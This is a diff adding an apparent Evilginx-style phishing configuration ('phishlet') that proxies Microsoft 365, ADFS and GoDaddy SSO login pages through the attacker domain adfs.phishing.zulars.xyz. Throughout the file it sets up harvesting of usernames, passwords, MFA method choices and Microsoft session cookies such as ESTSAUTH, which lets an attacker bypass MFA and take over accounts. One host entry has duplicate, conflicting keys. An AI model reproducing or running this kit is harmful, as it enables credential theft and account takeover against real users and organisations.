@@ -1,0 +1,544 @@
+name: Microsoft 365 with ADFS Bypass
+min_ver: 3.1.0
+proxy_hosts:
+  - phish_sub: login
+    orig_sub: login
+    domain: microsoftonline.com
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: portal
+    orig_sub: portal
+    domain: microsoftonline.com
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: account
+    orig_sub: account
+    domain: microsoftonline.com
+    session: false
+    is_landing: false
+    auto_filter: true
+  - phish_sub: www
+    orig_sub: www
+    domain: office.com
+    session: false
+    is_landing: false
+    auto_filter: true
+  - phish_sub: login-api
+    orig_sub: login
+    domain: microsoft.com
+    session: false
+    is_landing: false
+    auto_filter: true
+  - phish_sub: aadcdn
+    orig_sub: aadcdn
+    domain: msftauth.net
+    session: false
+    is_landing: false
+    auto_filter: true
+  - phish_sub: login-live
+    orig_sub: login
+    domain: live.com
+    session: false
+    is_landing: false
+    auto_filter: true
+  - phish_sub: ''
+    orig_sub: www
+    domain: microsoft365.com
+    session: false
+    is_landing: false
+    auto_filter: true
+    phish_sub: sso
+    orig_sub: sso
+    domain: godaddy.com
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: events.api
+    orig_sub: events.api
+    domain: godaddy.com
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: gui
+    orig_sub: gui
+    domain: godaddy.com
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: img1
+    orig_sub: img1
+    domain: wsimg.com
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: img6
+    orig_sub: img6
+    domain: wsimg.com
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: adfs
+    orig_sub: adfs
+    domain: adfs.phishing.zulars.xyz
+    session: true
+    is_landing: true
+sub_filters:
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: login
+    domain: microsoftonline.com
+    search: 'href="https://{hostname}'
+    replace: 'href="https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: login
+    domain: microsoftonline.com
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: login
+    domain: microsoftonline.com
+    search: 'https%3A%2F%2{hostname}/'
+    replace: 'https%3A%2F%2{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: login
+    domain: microsoftonline.com
+    search: '{hostname}'
+    replace: '{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: aadcdn
+    domain: msauth.net
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: aadcdn
+    domain: msauth.net
+    search: 'https%3A%2F%2{hostname}/'
+    replace: 'https%3A%2F%2{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: aadcdn
+    domain: msauth.net
+    search: '{hostname}'
+    replace: '{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: www
+    domain: office.com
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: www
+    domain: office.com
+    search: 'https%3A%2F%2{hostname}/'
+    replace: 'https%3A%2F%2{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: www
+    domain: office.com
+    search: '{hostname}'
+    replace: '{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: outlook
+    domain: office365.com
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: outlook
+    domain: office365.com
+    search: 'https%3A%2F%2{hostname}/'
+    replace: 'https%3A%2F%2{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: outlook
+    domain: office365.com
+    search: '{hostname}'
+    replace: '{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: r4.res
+    domain: office365.com
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: r4.res
+    domain: office365.com
+    search: 'https%3A%2F%2{hostname}/'
+    replace: 'https%3A%2F%2{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: r4.res
+    domain: office365.com
+    search: '{hostname}'
+    replace: '{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: sso
+    domain: godaddy.com
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: sso
+    domain: godaddy.com
+    search: 'https%3A%2F%2{hostname}/'
+    replace: 'https%3A%2F%2{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: sso
+    domain: godaddy.com
+    search: '{hostname}'
+    replace: '{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: adfs.adfs.phishing.zulars.xyz
+    orig_sub: sso
+    domain: godaddy.com
+    search: '{domain}'
+    replace: '{domain}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: events.api
+    domain: godaddy.com
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: events.api
+    domain: godaddy.com
+    search: 'https%3A%2F%2{hostname}/'
+    replace: 'https%3A%2F%2{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: events.api
+    domain: godaddy.com
+    search: '{hostname}'
+    replace: '{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: events.api
+    domain: godaddy.com
+    search: '{domain}'
+    replace: '{domain}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: gui
+    domain: godaddy.com
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: gui
+    domain: godaddy.com
+    search: 'https%3A%2F%2{hostname}/'
+    replace: 'https%3A%2F%2{hostname}/'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: gui
+    domain: godaddy.com
+    search: '{hostname}'
+    replace: '{hostname}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: gui
+    domain: godaddy.com
+    search: '{domain}'
+    replace: '{domain}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+  - triggers_on: sso.godaddy.com
+    orig_sub: ''
+    domain: wsimg.com
+    search: '{domain}'
+    replace: '{domain}'
+    mimes:
+      - text/html
+      - application/json
+      - application/javascript
+      - application/x-javascript
+      - application/ecmascript
+      - text/javascript
+      - text/ecmascript
+
+auth_tokens:
+  - domain: .login.microsoftonline.com
+    keys:
+      - ESTSAUTHPERSISTENT
+      - ESTSAUTH
+      - ch
+      - CCState
+      - CcsSharedSignInState
+      - '.*,regexp'
+      # - SignInStateCookie
+    type: cookie
+credentials:
+  username:
+    key: (login|UserName)
+    search: (.*)
+    type: json
+  password:
+    key: (passwd|Password|accesspass)
+    search: (.*)
+    type: json
+
+# custom mfa below might have to be turned off if its these credential config to use
+
+# credentials:
+#   username:
+#     key: ''
+#     search: '"username":"([^"]*)'
+#     type: json
+#   password:
+#     key: ''
+#     search: '"password":"([^"]*)'
+#     type: json
+
+  custom:
+    - key: mfaAuthMethod
+      search: (.*)
+      type: post
+
+# This is for the bleed out unfinished session password issue, if bleed out can be fixed, by finding a way to end godaddy sso session then this will be good, also note, for this to work, only ESTSAUTH, ESTSAUTHPERSISTENT and SignInStateCookie have to be enabled in auth tokens
+
+# auth_tokens:
+#   - domain: .login.microsoftonline.com
+#     keys:
+#       - ESTSAUTH
+#       - ESTSAUTHPERSISTENT
+#       - SignInStateCookie
+#     type: cookie
+# credentials:
+#   username:
+#     key: ''
+#     search: '"username":"([^"]*)'
+#     type: json
+#   password:
+#     key: ''
+#     search: '"password":"([^"]*)'
+#     type: json
+#   custom:
+#     - key: mfaAuthMethod
+#       search: (.*)
+#       type: post
+# login:
+
+login:
+  domain: login.microsoftonline.com
+  path: /
+force_post:
+  - path: /login.srf
+    search:
+      - key: wa
+        search: .*
+      - key: wresult
+        search: .*
+      - key: wctx
+        search: .*
+    force:
+      - key: wresult
+        search: 'http\:\/\/adfs\.phishing\.zulars\.xyz\:443'
+        value: 'http://adfs.phishing.zulars.xyz'
+    type: post
